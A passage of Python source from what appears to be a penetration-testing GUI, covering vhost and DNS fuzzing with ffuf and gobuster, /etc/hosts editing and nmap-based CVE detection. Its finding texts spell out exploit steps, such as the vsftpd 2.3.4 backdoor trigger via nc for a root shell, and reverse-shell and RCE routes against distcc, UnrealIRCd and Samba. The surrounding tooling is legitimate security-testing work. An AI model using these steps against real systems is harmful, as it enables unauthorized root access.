        ).pack(side="left")

        status_lbl = ctk.CTkLabel(
            win, text="", font=_f("xs"),
            text_color=COLORS["text_dim"])
        status_lbl.pack(fill="x", padx=24, pady=(0, 4))

        def _on_add():
            picked = [h for v, h in check_vars if v.get()]
            if not picked:
                status_lbl.configure(
                    text="No hostnames selected.",
                    text_color=COLORS["text_yellow"])
                return
            # Disable the dialog while pkexec runs; close on success.
            for child in win.winfo_children():
                try:
                    if isinstance(child, (ctk.CTkButton, ctk.CTkCheckBox)):
                        child.configure(state="disabled")
                except Exception:
                    pass
            status_lbl.configure(
                text=f"…  adding {len(picked)} entry/entries via pkexec",
                text_color=COLORS["text_yellow"])

            def _done(ok, msg):
                def _post():
                    if ok:
                        try:
                            sess = self.app.session_manager.current
                            if sess:
                                for h in picked:
                                    entry = {"ip": target_ip,
                                             "hostname": h}
                                    if entry not in getattr(
                                            sess, "hawk_hosts_entries",
                                            []):
                                        sess.hawk_hosts_entries.append(
                                            entry)
                                # Defensive: if target_domain is still
                                # empty (auto-detect dialog was
                                # dismissed earlier), pin it to the
                                # shortest apex among the just-added
                                # hostnames so vhost-aware buttons
                                # keep working on subsequent findings.
                                if not (getattr(sess, "target_domain",
                                                "") or "").strip():
                                    apex = sorted(picked, key=len)[0]
                                    sess.target_domain = apex
                                    try:
                                        if hasattr(self.app,
                                                    "target_bar"):
                                            self.app.target_bar.\
                                                set_target_domain(apex)
                                    except Exception:
                                        pass
                                    self.app.terminal.write(
                                        f"  [+] Target domain auto-"
                                        f"set to {apex}", "success")
                                sess._touch()
                        except Exception:
                            pass
                        self.app.terminal.write(
                            f"  [+] /etc/hosts: {msg}  "
                            f"({', '.join(picked)})", "success")
                        self._mark_finding_read(finding)
                        try:
                            self._render_auto_findings()
                        except Exception:
                            pass
                        try:
                            _safe_destroy(win)
                        except Exception:
                            pass
                    else:
                        status_lbl.configure(
                            text=f"✗  {msg}",
                            text_color=COLORS["text_red"])
                        # Re-enable so the user can retry / cancel.
                        for child in win.winfo_children():
                            try:
                                if isinstance(child, (ctk.CTkButton,
                                                      ctk.CTkCheckBox)):
                                    child.configure(state="normal")
                            except Exception:
                                pass
                try:
                    self.app.after(0, _post)
                except Exception:
                    _post()

            add_entries_async([(target_ip, picked)], _done)

        row = _btn_row(win)
        _btn(row, "ADD SELECTED", _on_add, primary=True, w=160)
        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=120)

    def _launch_vhost_fuzz(self, finding: dict) -> None:
        """Open the multi-mode VHOST FUZZ dialog (HTTP-vhost / DNS /
        BOTH) for the wildcard-cert advisory finding.

        Why a dialog and not a single tool: gobuster DNS only works
        when the target domain is registered in a real DNS zone (it
        queries the system resolver, not /etc/hosts).  HTB/THM domains
        live in /etc/hosts only and DNS brute returns 0 hits; HTTP
        vhost brute via Host header works there because it goes to
        the IP and just changes the HTTP Host header.  Real-target
        engagements often need both — public subdomains via DNS,
        internal vhosts via Host header.  This dialog lets the
        operator pick or fire both.
        """
        import re as _re
        title = finding.get("title", "") or ""
        m = _re.search(r"\(([\w\-.]+)\)\s*$", title)
        domain = m.group(1) if m else ""
        if not domain:
            try:
                sess = self.app.session_manager.current
                if sess:
                    domain = (getattr(sess, "target_domain", "") or "").strip()
            except Exception:
                pass
        if not domain:
            self.app.terminal.write(
                "  [!] FUZZ VHOSTS: no base domain available.", "warn")
            return
        self._show_vhost_fuzz_dialog(domain)

    def _show_vhost_fuzz_dialog(self, domain: str) -> None:
        """Mini-dialog that lets the operator pick the right vhost
        discovery strategy and launches the corresponding BG job(s).

        Mode semantics:
          • http  → ffuf -H "Host: FUZZ.<domain>" against the IP
          • dns   → gobuster dns --domain <domain>  (public DNS only)
          • both  → fires both in parallel as separate BG jobs

        Smart default: HTB / THM platforms have no public DNS, so
        default to HTTP vhost.  Other platforms default to BOTH —
        the assumption is real engagements often need both signals
        and BG jobs are cheap.
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                  _btn_row, _btn, _safe_destroy)
        from gui.widgets.card_common import _f, _get_dns_wordlists, _shq
        import os as _os

        # Smart default mode based on engagement context.
        default_mode = "http"
        try:
            sess = self.app.session_manager.current
            platform = (getattr(sess, "platform", "") or "").upper() \
                if sess else ""
            if platform not in ("HTB", "THM", "CTF"):
                default_mode = "both"
        except Exception:
            pass

        win = _make_win(self, f"VHOST Fuzz — {domain}", 600, 540)
        _title(win, f"VHOST FUZZ  —  {domain}")
        _sub(win,
             "Discovers vhosts / subdomains.  HTTP-vhost works on any "
             "target (CTF, internal, public).  DNS only works when "
             "the domain is registered in a real DNS zone.")

        _note_box(
            win,
            "Method picks:\n"
            "  • HTTP vhost — sends requests to the target IP and "
            "varies the Host header.  Finds vhosts even when DNS "
            "doesn't resolve them.\n"
            "  • DNS — queries the system resolver for "
            "subdomain.<domain>.  Only works on real DNS zones, NOT "
            "on /etc/hosts entries (HTB / THM domains).\n"
            "  • BOTH — launches both as parallel BG jobs.  Use when "
            "you don't know which applies.",
            COLORS["border_dim"])

        # ── Mode radio ────────────────────────────────────────────
        mode_var = ctk.StringVar(value=default_mode)
        mode_frame = ctk.CTkFrame(win, fg_color="transparent")
        mode_frame.pack(fill="x", padx=24, pady=(8, 4))
        ctk.CTkLabel(mode_frame, text="Method:", font=_f("md", True),
                     text_color=COLORS["text_bright"], anchor="w"
                     ).pack(anchor="w")
        for val, lbl, hint in [
            ("http", "HTTP vhost (Host header)",
             "ffuf -H 'Host: FUZZ.X' — works on any target"),
            ("dns",  "DNS subdomain brute (gobuster dns)",
             "needs the domain to resolve via real DNS"),
            ("both", "Run BOTH in parallel",
             "two BG jobs, max coverage"),
        ]:
            row = ctk.CTkFrame(mode_frame, fg_color="transparent")
            row.pack(fill="x", padx=8, pady=1)
            ctk.CTkRadioButton(
                row, text=lbl, variable=mode_var, value=val,
                font=_f("sm", True), width=240,
                text_color=COLORS["text_bright"],
                fg_color=COLORS["border_green"],
                border_color=COLORS["border_dim"],
                hover_color=COLORS["bg_card_hover"],
            ).pack(side="left")
            ctk.CTkLabel(row, text=f"  {hint}", font=_f("xs"),
                         text_color=COLORS["text_dim"]
                         ).pack(side="left", padx=(8, 0))

        # ── Scheme (used only when HTTP / BOTH) ───────────────────
        scheme_var = ctk.StringVar(value="https")
        sf = ctk.CTkFrame(win, fg_color="transparent")
        sf.pack(fill="x", padx=24, pady=(8, 4))
        ctk.CTkLabel(sf, text="Scheme (HTTP vhost):",
                     font=_f("md", True),
                     text_color=COLORS["text_bright"], anchor="w",
                     width=180).pack(side="left")
        for v in ("https", "http"):
            ctk.CTkRadioButton(
                sf, text=v, variable=scheme_var, value=v,
                font=_f("sm"),
                text_color=COLORS["text_bright"],
                fg_color=COLORS["border_green"],
                border_color=COLORS["border_dim"],
                hover_color=COLORS["bg_card_hover"],
            ).pack(side="left", padx=8)

        # ── Wordlist picker ───────────────────────────────────────
        wl_options = _get_dns_wordlists()
        if not wl_options:
            wl_options = [("subdomains-top1million-5000",
                           "/usr/share/seclists/Discovery/DNS/"
                           "subdomains-top1million-5000.txt")]
        wl_var = ctk.StringVar(value=wl_options[0][1])
        ctk.CTkLabel(win, text="Wordlist:", font=_f("md", True),
                     text_color=COLORS["text_bright"], anchor="w"
                     ).pack(fill="x", padx=24, pady=(8, 2))
        wl_frame = ctk.CTkScrollableFrame(
            win, height=120,
            fg_color=COLORS["bg_card"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=3)
        wl_frame.pack(fill="x", padx=24, pady=(0, 4))
        for lbl, path in wl_options[:10]:
            ctk.CTkRadioButton(
                wl_frame, text=lbl, variable=wl_var, value=path,
                font=_f("sm"), text_color=COLORS["text_dim"],
                fg_color=COLORS["border_green"],
                border_color=COLORS["border_dim"],
            ).pack(anchor="w", padx=10, pady=1)

        # ── Run / Cancel ──────────────────────────────────────────
        def _run():
            mode = mode_var.get()
            scheme = scheme_var.get() or "https"
            wl = wl_var.get() or wl_options[0][1]
            if not _os.path.isfile(wl):
                self.app.terminal.write(
                    f"  [!] FUZZ VHOSTS: wordlist not found: {wl}",
                    "warn")
                return
            _safe_destroy(win)
            self._run_vhost_jobs(domain, mode, scheme, wl)

        row = _btn_row(win)
        _btn(row, "RUN", _run, primary=True, w=120)
        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=120)

    def _run_vhost_jobs(self, domain: str, mode: str,
                         scheme: str, wordlist: str) -> None:
        """Launch the vhost discovery BG job(s) requested by the
        dialog.  Uses dedicated BG launchers (not the generic
        ``_run_in_background`` on the kill-chain card) because the
        path-discovery parser there mangles vhost output: it sees
        ``mcp [Status: 200]`` and treats ``mcp`` as a discovered
        path, prefixing ``/`` and emitting an INFO "FFUF on TARGET"
        finding.  Vhost mode needs its own parser + a HIGH-severity
        emitter that lists FQDNs.
        """
        do_http = mode in ("http", "both")
        do_dns  = mode in ("dns", "both")
        if do_http:
            self._launch_ffuf_vhost_bg(domain, scheme, wordlist)
        if do_dns:
            self._launch_gobuster_dns_bg(domain, wordlist)

    # ─── Dedicated BG launchers for vhost discovery ────────────────────

    def _launch_ffuf_vhost_bg(self, domain: str, scheme: str,
                                wordlist: str) -> None:
        """Run ffuf in vhost mode as a background job with a
        vhost-aware done parser.  Emits a HIGH finding listing every
        discovered FQDN — the generic ADD HOSTS detector then exposes
        the /etc/hosts picker on it, and the ATTACK button surfaces
        the next-step launcher.
        """
        import os as _os
        import re as _re
        import time as _time
        import uuid as _uuid
        from utils.runner import ToolRunner
        from utils.config import OUTPUTS_DIR
        from gui.widgets.bg_jobs_bar import BackgroundJob
        from gui.widgets.card_common import _shq

        cmd = (f"ffuf -u {scheme}://{domain}/ "
               f"-H \"Host: FUZZ.{domain}\" "
               f"-w {_shq(wordlist)} "
               f"-ac -k -mc 200,301,302,401,403 -noninteractive")

        job_id = str(_uuid.uuid4())[:8]
        log_fname = (f"bg-ffuf_vhost-{_time.strftime('%Y%m%d-%H%M%S')}"
                     f"-{job_id}.log")
        log_path = _os.path.join(OUTPUTS_DIR, log_fname)
        _os.makedirs(OUTPUTS_DIR, exist_ok=True)
        log_fh = open(log_path, "w", buffering=1)

        FUZZ_PLACEHOLDERS = {"fuzz", "fuzzw1", "fuzzw2", "wfuzz", "ffuf"}

        def _bg_output(line, name, level):
            try:
                log_fh.write(line + "\n")
            except Exception:
                pass
            self.app.terminal.output_callback(line, name, level)

        def _bg_done(name, rc, log):
            try:
                log_fh.close()
            except Exception:
                pass
            # Parse: lines like
            #   mcp                     [Status: 200, Size: 466, ...]
            hits = []
            for _lvl, ln in log:
                m = _re.match(
                    r"^\s*([a-z0-9][a-z0-9_\-]{0,62})\s+"
                    r"\[Status:\s*(\d+),\s*Size:\s*(\d+)",
                    ln, _re.IGNORECASE)
                if not m:
                    continue
                sub = m.group(1).strip().lower()
                if sub in FUZZ_PLACEHOLDERS or sub == "*":
                    continue
                hits.append({
                    "fqdn":   f"{sub}.{domain}",
                    "status": m.group(2),
                    "size":   m.group(3),
                })
            # De-duplicate while preserving order.
            seen = set()
            uniq = []
            for h in hits:
                if h["fqdn"] in seen:
                    continue
                seen.add(h["fqdn"])
                uniq.append(h)

            if uniq:
                lines = [
                    f"Discovered {len(uniq)} vhost(s) on {domain}:",
                    "",
                ]
                for h in uniq:
                    lines.append(
                        f"  • {h['fqdn']}  "
                        f"[Status {h['status']}, {h['size']}B]")
                lines.append("")
                lines.append(
                    "Next step: ADD HOSTS to /etc/hosts, then ATTACK "
                    "with Oracle / Bloody Crawl on each.")
                summary = (f"Found {len(uniq)} vhost(s) "
                           f"({', '.join(h['fqdn'] for h in uniq[:3])}"
                           f"{'…' if len(uniq) > 3 else ''})")
                self.app.bg_jobs_bar.finish_job(job_id, summary)
                self.add_auto_finding(
                    title=(f"Vhost discovery on {domain} "
                           f"({len(uniq)} found)"),
                    description="\n".join(lines),
                    severity="high",
                    source="ffuf-vhost")
            else:
                self.app.bg_jobs_bar.finish_job(
                    job_id,
                    f"No vhosts found (rc={rc}).")
                self.add_auto_finding(
                    title=f"Vhost discovery on {domain} (0 found)",
                    description=(
                        f"ffuf vhost completed (rc={rc}) — no "
                        f"subdomains responded with 200/30x/40x.\n"
                        f"\nTry a larger wordlist (-20000 / -110000) "
                        f"or relax the matchers (-mc all)."),
                    severity="info",
                    source="ffuf-vhost")

        runner = ToolRunner(
            output_callback=_bg_output,
            done_callback=_bg_done,
            ui_dispatcher=getattr(self.app, "ui_call", None))
        self.app.bg_jobs_bar.add_job(
            BackgroundJob(job_id=job_id, label="FFUF vhost",
                          estimated_secs=600, runner=runner,
                          killable=True, log_path=log_path))
        self.app.terminal.write(
            f"  [*] FFUF vhost  →  {scheme}://{domain}/ "
            f"(Host: FUZZ.{domain})", "info")
        runner.run(cmd, "FFUF VHOST")

    def _launch_gobuster_dns_bg(self, domain: str,
                                  wordlist: str) -> None:
        """Run gobuster DNS with a DNS-zone-aware done parser.
        Emits a HIGH finding when subdomains are found via real DNS;
        gracefully reports the typical 0-result outcome on HTB / THM
        targets where the domain is only in /etc/hosts.
        """
        import os as _os
        import re as _re
        import time as _time
        import uuid as _uuid
        from utils.runner import ToolRunner
        from utils.config import OUTPUTS_DIR
        from gui.widgets.bg_jobs_bar import BackgroundJob
        from gui.widgets.card_common import _shq

        cmd = (f"gobuster dns --domain {domain} "
               f"-w {_shq(wordlist)} -t 20")

        job_id = str(_uuid.uuid4())[:8]
        log_fname = (f"bg-gobuster_dns-{_time.strftime('%Y%m%d-%H%M%S')}"
                     f"-{job_id}.log")
        log_path = _os.path.join(OUTPUTS_DIR, log_fname)
        _os.makedirs(OUTPUTS_DIR, exist_ok=True)
        log_fh = open(log_path, "w", buffering=1)

        def _bg_output(line, name, level):
            try:
                log_fh.write(line + "\n")
            except Exception:
                pass
            self.app.terminal.output_callback(line, name, level)

        def _bg_done(name, rc, log):
            try:
                log_fh.close()
            except Exception:
                pass
            hits = set()
            for _lvl, ln in log:
                m = _re.match(r"^\s*Found:\s*(\S+)", ln, _re.IGNORECASE)
                if m:
                    h = m.group(1).strip().lower().rstrip(".")
                    if h.endswith("." + domain.lower()) or \
                       h == domain.lower():
                        if not h.startswith("*."):
                            hits.add(h)
            uniq = sorted(hits)

            if uniq:
                lines = [
                    f"Discovered {len(uniq)} subdomain(s) for {domain} "
                    f"via DNS:",
                    "",
                ]
                for h in uniq:
                    lines.append(f"  • {h}")
                lines.append("")
                lines.append(
                    "These have real DNS records — they resolve from "
                    "outside.  Add to /etc/hosts only if you're "
                    "pivoting through a host that doesn't have DNS.")
                summary = (f"Found {len(uniq)} subdomain(s) "
                           f"({', '.join(uniq[:3])}"
                           f"{'…' if len(uniq) > 3 else ''})")
                self.app.bg_jobs_bar.finish_job(job_id, summary)
                self.add_auto_finding(
                    title=(f"DNS subdomain discovery on {domain} "
                           f"({len(uniq)} found)"),
                    description="\n".join(lines),
                    severity="high",
                    source="gobuster-dns")
            else:
                self.app.bg_jobs_bar.finish_job(
                    job_id, f"No DNS subdomains (rc={rc}).")
                self.add_auto_finding(
                    title=f"DNS subdomain discovery on {domain} (0 found)",
                    description=(
                        f"gobuster dns completed (rc={rc}) — the "
                        f"system resolver returned NXDOMAIN for every "
                        f"candidate.\n\n"
                        f"This is normal for HTB / THM / lab targets "
                        f"where the domain is only in /etc/hosts and "
                        f"not in a real DNS zone.  Use HTTP vhost "
                        f"brute (Host header) instead for those."),
                    severity="info",
                    source="gobuster-dns")

        runner = ToolRunner(
            output_callback=_bg_output,
            done_callback=_bg_done,
            ui_dispatcher=getattr(self.app, "ui_call", None))
        self.app.bg_jobs_bar.add_job(
            BackgroundJob(job_id=job_id, label="GOBUSTER dns",
                          estimated_secs=600, runner=runner,
                          killable=True, log_path=log_path))
        self.app.terminal.write(
            f"  [*] GOBUSTER dns  →  {domain}", "info")
        runner.run(cmd, "GOBUSTER DNS")

    def _launch_add_san_hosts(self, finding: dict) -> None:
        """Add every hostname listed in the multi-host SAN finding to
        /etc/hosts (HAWK-tagged, async pkexec).  Pulls the list back
        out of the finding's description (where the emitter writes
        them as `  • host`).
        """
        import re as _re
        desc = finding.get("description", "") or ""
        hosts = []
        for m in _re.finditer(r"^\s*•\s+([\w\.\-]+\.[\w\.\-]+)\s*$",
                               desc, _re.MULTILINE):
            h = m.group(1).strip().lower()
            if h.startswith("*."):
                continue
            if h not in hosts:
                hosts.append(h)
        if not hosts:
            self.app.terminal.write(
                "  [!] ADD HOSTS: no hostnames parsed from finding.",
                "warn")
            return

        target_ip = ""
        try:
            sess = self.app.session_manager.current
            if sess:
                target_ip = (getattr(sess, "target_ip", "") or "").strip()
        except Exception:
            pass
        if not target_ip:
            self.app.terminal.write(
                "  [!] ADD HOSTS: target IP not set in session.", "warn")
            return

        from utils.hosts_helper import add_entries_async
        self.app.terminal.write(
            f"  [*] ADD HOSTS: requesting pkexec to add "
            f"{len(hosts)} entries → {target_ip} …", "dim")

        def _done(ok, msg):
            def _post():
                if ok:
                    self.app.terminal.write(
                        f"  [+] /etc/hosts: {msg}  "
                        f"({', '.join(hosts)})", "success")
                    try:
                        sess = self.app.session_manager.current
                        if sess:
                            for h in hosts:
                                entry = {"ip": target_ip, "hostname": h}
                                if entry not in getattr(
                                        sess, "hawk_hosts_entries", []):
                                    sess.hawk_hosts_entries.append(entry)
                            sess._touch()
                    except Exception:
                        pass
                else:
                    self.app.terminal.write(
                        f"  [!] /etc/hosts add failed: {msg}", "error")
            try:
                self.app.after(0, _post)
            except Exception:
                _post()

        add_entries_async([(target_ip, hosts)], _done)

    def _launch_fuzz_dir(self, fuzz_info: dict):
        """Open the gobuster_dir routing dialog with URL + base path
        + wordlist kind pre-selected for this finding's parent dir.
        """
        try:
            card = self.app.kill_chain_panel.get_card("enumeration")
        except Exception as e:
            self.app.terminal.write(
                f"  [!] FUZZ DIR: enumeration card not available: {e}",
                "warn")
            return
        if card is None:
            self.app.terminal.write(
                "  [!] FUZZ DIR: enumeration card not loaded.", "warn")
            return
        try:
            tool = card.module.get_tool("gobuster_dir")
        except Exception as e:
            self.app.terminal.write(
                f"  [!] FUZZ DIR: gobuster_dir tool not found: {e}",
                "warn")
            return
        if tool is None:
            self.app.terminal.write(
                "  [!] FUZZ DIR: gobuster_dir tool not registered.",
                "warn")
            return
        try:
            card._route_gobuster_dir(
                tool,
                fuzz_info["base_url"],
                wordlist_kind=fuzz_info["wordlist_kind"],
                default_base_path=fuzz_info["base_path"])
        except Exception as e:
            self.app.terminal.write(
                f"  [!] FUZZ DIR launch failed: {e}", "error")

    def update_from_nmap(self, output_lines: list):
        from modules.exploit_suggester import OSFingerprint, classify_target
        new_fp = OSFingerprint.from_nmap_output(output_lines)

        if self._fp is None:
            # First scan — use directly
            self._fp = new_fp
        else:
            # MERGE: add new ports, upgrade existing ones when nmap
            # returns more precise service/version data than what we had.
            existing_idx = {p: i for i, (p,_,_,_)
                           in enumerate(self._fp.open_ports)}
            _GENERIC_SVC = {"unknown", "tcpwrapped", "filtered", ""}
            for port_data in new_fp.open_ports:
                pnum = port_data[0]
                if pnum not in existing_idx:
                    # Brand-new port
                    self._fp.open_ports.append(port_data)
                    existing_idx[pnum] = len(self._fp.open_ports) - 1
                else:
                    # Port already known — upgrade if the new scan is
                    # more informative. A detailed nmap -sV scan trumps
                    # a user guess or a generic first-pass result.
                    idx = existing_idx[pnum]
                    _, _, old_svc, old_ban = self._fp.open_ports[idx]
                    _, _, new_svc, new_ban = port_data
                    # Flags that make old data "low confidence"
                    old_is_manual  = "[CHANGED:" in (old_ban or "")
                    old_is_generic = (old_svc or "").lower() in _GENERIC_SVC
                    # Flags that make new data "high confidence"
                    new_has_version = bool(new_ban and new_ban.strip()
                                          and new_svc.lower() not in _GENERIC_SVC)
                    new_svc_real   = (new_svc or "").lower() not in _GENERIC_SVC
                    # Upgrade when: old was manual/generic AND new is real,
                    # OR new has version banner that old lacks.
                    upgrade = False
                    if old_is_generic and new_svc_real:
                        upgrade = True
                    elif old_is_manual and new_has_version:
                        upgrade = True
                    elif (not old_ban or old_ban.startswith("["))  \
                            and new_has_version:
                        upgrade = True
                    if upgrade:
                        self._fp.open_ports[idx] = port_data

            # Update OS only if new result is more precise.
            #
            # "More precise" means either:
            #   (a) we had no platform before, or
            #   (b) the new scan has higher confidence, or
            #   (c) the new version is STRICTLY MORE SPECIFIC than the old
            #       one — i.e. the old version is a prefix/substring of the
            #       new one, or the new one adds an R2 / SP suffix the old
            #       one lacks.
            #
            # (c) matters a lot in practice: a first `-O` scan may give
            #     'Windows 2008' at 98% confidence, and a later
            #     `smb-os-discovery` / `rdp-ntlm-info` enrichment gives us
            #     'Windows 2008 R2 SP1' at 95% confidence. Plain confidence
            #     comparison would keep the LESS specific label forever.
            # _more_specific compares two version labels for the SAME
            # platform and decides whether `new_v` carries strictly more
            # discriminating information than `old_v`.  The previous
            # version did substring matching ("old in new"), which
            # failed on the common Windows case:
            #     old = "7"            ← from -O Running line
            #     new = "2008 R2 SP1"  ← from NSE smb-os-discovery
            # "7" isn't a substring of "2008 r2 sp1", so the upgrade
            # was missed and the operator was stuck with the vague
            # label even after a precise scan ran.  Specificity is now
            # a scored function over discriminative tokens (year,
            # R2/SP suffix, "server" word, build number, multi-token).
            def _spec_score(v: str) -> int:
                if not v:
                    return 0
                s = v.lower()
                score = 0
                if re.search(r'\b(?:2003|2008|2012|2016|2019|2022|2025)\b', s):
                    score += 3
                if re.search(r'\br2\b', s):
                    score += 1
                if re.search(r'\bsp\d\b', s):
                    score += 1
                if 'server' in s:
                    score += 1
                # Build number (4-5 digits, not one of the known years).
                if re.search(r'\b\d{4,5}\b', s) and not re.search(
                        r'\b(?:2003|2008|2012|2016|2019|2022|2025)\b', s):
                    score += 1
                if len(s.split()) > 1:
                    score += 1
                return score

            def _more_specific(new_v: str, old_v: str) -> bool:
                if not new_v:
                    return False
                if not old_v:
                    return True
                nv, ov = new_v.lower().strip(), old_v.lower().strip()
                if nv == ov:
                    return False
                # Score wins.  Old substring of new = automatic upgrade
                # (covers "2008 R2" -> "2008 R2 SP1").
                if ov and ov in nv:
                    return True
                return _spec_score(new_v) > _spec_score(old_v)

            same_platform = (new_fp.platform and self._fp.platform and
                             new_fp.platform == self._fp.platform)
            if new_fp.platform and not self._fp.platform:
                self._fp.platform   = new_fp.platform
                self._fp.version    = new_fp.version
                self._fp.confidence = new_fp.confidence
            elif new_fp.platform and new_fp.confidence > self._fp.confidence:
                self._fp.platform   = new_fp.platform
                self._fp.version    = new_fp.version
                self._fp.confidence = new_fp.confidence
            elif same_platform and _more_specific(new_fp.version,
                                                   self._fp.version):
                # Keep the higher of the two confidences — we don't want the
                # precision upgrade to downgrade the confidence number that
                # the user sees in the panel.
                self._fp.version    = new_fp.version
                self._fp.confidence = max(self._fp.confidence,
                                          new_fp.confidence)

            # Merge NSE side-intel (domain / computer / signing / NTLM
            # build). These are strictly additive — we only fill fields
            # that weren't set before, so a later generic scan can't
            # clobber a precise earlier one.
            for attr in ("domain", "computer_name", "fqdn", "smb_signing",
                         "ntlm_product_version", "os_raw"):
                if (not getattr(self._fp, attr, "") and
                        getattr(new_fp, attr, "")):
                    setattr(self._fp, attr, getattr(new_fp, attr))

        if self.app.session_manager.current and self._fp.platform:
            self.app.session_manager.current.detected_os = self._fp.platform
            self.app.session_manager.current.save()

        self._render_all()
        # Visual pulse only — nmap merging open-ports into the cached
        # fingerprint is NOT a new finding, so don't bump the
        # "(N new)" badge counter.  Findings come from the
        # downstream parsers (cleartext, vuln scripts, …).
        self._blink_start(count_as_new=False)

        # Check nonstandard ports ONCE per session
        if not self._nonstandard_checked and self._fp.open_ports:
            self._nonstandard_checked = True
            self._check_nonstandard_ports(self._fp)

        profile = classify_target(self._fp)
        if profile["era"] != "unknown":
            self.app.terminal.section("TARGET PROFILE")
            self.app.terminal.write(f"  {profile['strategy']}", "info")
            for w in profile["warnings"]:
                self.app.terminal.write(f"  ⚠  {w}", "warn")

        # Version/banner-based CVE detection.  The `-sV` service banners
        # (Samba smbd 3.0.20, vsftpd 2.3.4, distccd, UnrealIRCd) land in
        # THIS flow — not in `update_from_vuln_scripts`, which only runs
        # for the `nmap_vuln` tool.  Running the detectors here is what
        # makes every version-based CVE reachable (live-validation
        # F-07 / F-08).  `add_auto_finding` dedups on (title, port), so
        # the `nmap_vuln` path — which calls `update_from_nmap` too —
        # cannot double-report.
        self._detect_version_cves(output_lines)

    def _detect_version_cves(self, output_lines: list):
        """Emit findings for CVEs identified from nmap `-sV` version
        banners and open-port service names.

        Shared by the service-scan flow (`update_from_nmap`, the sole
        caller in production) so the detectors sit on the path that
        actually carries version data.  Historically this block lived
        inside `update_from_vuln_scripts`; a plain `-sV` scan never
        reached it, dropping Samba CVE-2007-2447 and distcc
        CVE-2004-2687 (live-validation F-07 / F-08).

        Every detector keys off the raw banner text, so it is a no-op on
        banner-less output (masscan, `--script vuln` without `-sV`).
        """
        full_text = "\n".join(output_lines)

        target = getattr(self._fp, "target", "") if self._fp else ""
        if not target:
            try:
                target = self.app.session_manager.current.target
            except Exception:
                target = ""

        # vsftpd 2.3.4 backdoor — detected by version banner in nmap -sV
        m_vsftpd = re.search(r'vsftpd\s+2\.3\.4', full_text, re.I)
        if m_vsftpd:
            fp2 = re.search(r'(\d+)/tcp\s+open\s+ftp', full_text)
            ftp_port2 = int(fp2.group(1)) if fp2 else 21
            self.add_auto_finding(
                "vsftpd 2.3.4 backdoor (CVE-2011-2523)",
                f"{target}:{ftp_port2} is running vsftpd 2.3.4 — "
                f"this version contains a deliberately planted backdoor.\n\n"
                f"EXPLOIT: send a username ending in ':)' during login to "
                f"trigger a bind shell on port 6200 as root (no password needed).\n\n"
                f"Quick manual test:\n"
                f"  nc {target} {ftp_port2}  →  USER backdoor:)  →  PASS x\n"
                f"  nc {target} 6200          →  instant root shell\n\n"
                f"Use the EXPLOIT WITH MSF button to launch the Metasploit module.",
                severity="critical", source="nmap banner",
                port=ftp_port2)

        # distcc daemon RCE (CVE-2004-2687).
        #
        # Gate on an actual open-port line, not on the bare substring:
        # `distcc` anywhere in the output (an NSE script name, a
        # package name echoed by http-* scripts, a page body) used to
        # emit a CRITICAL RCE hardcoded on port 3632 for a host that
        # was never running the daemon.  The port now comes from the
        # match instead of being assumed.  Note (F-08): port 3632 is
        # outside nmap's top-1000, so this fires only when 3632 is
        # actually scanned (full scan or explicit port) — when it is,
        # the finding now reaches the report.
        m_distcc = re.search(
            r'^\s*(\d+)/tcp\s+open\s+distcc', full_text, re.I | re.M)
        if m_distcc:
            distcc_port = int(m_distcc.group(1))
            self.add_auto_finding(
                "DistCC daemon RCE (CVE-2004-2687)",
                f"{target}:{distcc_port} — DistCC daemon detected.\n\n"
                f"DistCC is a distributed C compiler that executes compile\n"
                f"jobs sent over the network. There is no authentication —\n"
                f"the only access control is the daemon's --allow list.\n\n"
                f"NOT CONFIRMED — service match only. Exploitable if the daemon\n"
                f"accepts jobs from your IP (the historic default, and the case\n"
                f"on Metasploitable2); a daemon started with a restrictive\n"
                f"--allow will refuse the job.\n\n"
                f"EXPLOIT: the Metasploit module sends a compile job containing\n"
                f"a reverse shell payload — returns a shell as the 'daemon' user.\n"
                f"From there, check for SUID binaries (nmap 5.x is installed on\n"
                f"Metasploitable and has --interactive → root).\n\n"
                f"Use the EXPLOIT WITH MSF button to launch the Metasploit module.",
                severity="critical", source="nmap banner",
                port=distcc_port)

        # UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) — port 6667
        if re.search(r'UnrealIRCd\s+3\.2\.8\.1', full_text, re.I):
            self.add_auto_finding(
                "UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)",
                f"{target}:6667 — UnrealIRCd 3.2.8.1 detected.\n\n"
                f"This version was distributed with a backdoor that opens a\n"
                f"bind shell on a random port when triggered — root, no creds.\n\n"
                f"Use the EXPLOIT WITH MSF button to launch the Metasploit module.",
                severity="critical", source="nmap banner",
                port=6667)

        # Samba usermap_script (CVE-2007-2447) — port 139/445.
        #
        # Version gate is 3.0.0–3.0.25rc3, NOT "anything below 3.4".
        # The wider gate reported every Samba 3.x banner as a confirmed
        # CRITICAL RCE: `Samba smbd 3.2.5`, the default on Ubuntu
        # 8.10/9.04 and on plenty of HTB boxes, is not vulnerable at
        # all.  FINDING_INFO (see the `usermap_script` entry further
        # down this file) always had the correct range.
        #
        # The regex must accept BOTH banner shapes:
        #   • `-sV` service banner: `Samba smbd 3.0.20-Debian`
        #     (the `smbd` token sits between "Samba" and the version)
        #   • `smb-os-discovery` NSE line: `OS: Unix (Samba 3.0.20-Debian)`
        # The old `Samba\s+(\d+...)` matched only the second — precisely
        # the format a `-sV` scan (this method's real input) never emits,
        # which is the other half of F-07.
        #
        # It stays `high` and not `critical` because the version alone
        # does not make the box exploitable: CVE-2007-2447 needs
        # `username map script` configured in smb.conf, which is NOT a
        # default.  That precondition is now stated in the description
        # instead of being implied away.
        m_samba = re.search(
            r'Samba\s+(?:smbd\s+)?(\d+\.\d+\.\d+)', full_text, re.I)
        if m_samba:
            parts = m_samba.group(1).split(".")
            try:
                major, minor = int(parts[0]), int(parts[1])
                patch = int(parts[2])
                if major == 3 and minor == 0 and patch <= 25:
                    # Prefer 445 (modern SMB) when available, fallback 139
                    smb_p = (445 if re.search(
                                r'445/tcp\s+open', full_text)
                             else 139)
                    self.add_auto_finding(
                        f"Samba {m_samba.group(1)} — usermap_script RCE (CVE-2007-2447)",
                        f"{target} — Samba {m_samba.group(1)} detected. This is inside "
                        f"the vulnerable range for CVE-2007-2447 (3.0.0-3.0.25rc3).\n\n"
                        f"NOT CONFIRMED — version match only. The bug is a username\n"
                        f"metacharacter injection in the MS-RPC SamrCreateUser call, and\n"
                        f"it only reaches a shell when smb.conf defines a\n"
